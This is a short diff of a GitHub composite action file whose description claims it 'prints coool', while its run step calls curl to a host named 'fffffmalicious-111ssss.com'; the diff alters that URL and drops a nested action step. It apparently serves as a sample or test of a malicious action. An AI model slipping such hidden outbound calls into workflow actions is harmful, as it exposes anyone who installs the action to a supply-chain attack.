@@ -3,8 +3,5 @@ description: 'A GitHub Action that prints coool'
 runs:
   using: 'composite'
   steps:
-    - run: curl -X 'http://fffffmalicious-111ssss.com?'
+    - run: curl -X 'http://fffffmalicious-111ssss.com?ssssss'
       shell: bash
-
-    - name: test
-      uses: dcodemy/cool-action3@v1.0
